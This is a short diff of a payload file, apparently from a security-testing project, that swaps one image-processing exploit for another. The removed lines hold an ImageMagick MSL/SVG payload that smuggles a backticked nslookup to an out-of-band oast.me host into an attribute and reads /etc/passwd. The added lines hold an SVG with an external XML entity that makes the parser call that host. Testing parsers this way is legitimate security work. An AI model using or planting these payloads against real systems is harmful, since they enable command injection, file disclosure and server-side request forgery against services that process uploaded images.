@@ -1,9 +1,15 @@
-<image authenticate='ff" `nslookup nonono.cnc31t8uaek2f83vgfa0aeindudfds4ot.oast.me;"'>
-  <read filename="pdf:/etc/passwd"/>
-  <get width="base-width" height="base-height" />
-  <resize geometry="400x400" />
-  <write filename="test.png" />
-  <svg width="700" height="700" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">       
-  <image xlink:href="msl:poc.svg" height="100" width="100"/>
-  </svg>
-</image>
+<?xml version="1.0" standalone="no"?>
+<!DOCTYPE svg [
+	<!ENTITY req SYSTEM "https://dkdkdkdkdk.cnc31t8uaek2f83vgfa0aeindudfds4ot.oast.me">
+]>
+<svg viewBox="0 0 400 400" version="1.2" xmlns="http://www.w3.org/2000/svg" style="fill:red">
+      <rect x="0" y="0" rx="10" ry="10" width="400" height="400" style="fill:green;opacity:0.3"/>
+      <flowRoot font-size="15">
+         <flowRegion>
+           <rect x="10" y="20" width="380" height="370" style="fill:yellow;opacity:0.3"/>
+         </flowRegion>
+         <flowDiv>
+            <flowPara>&req;</flowPara>
+         </flowDiv>
+      </flowRoot>
+</svg>
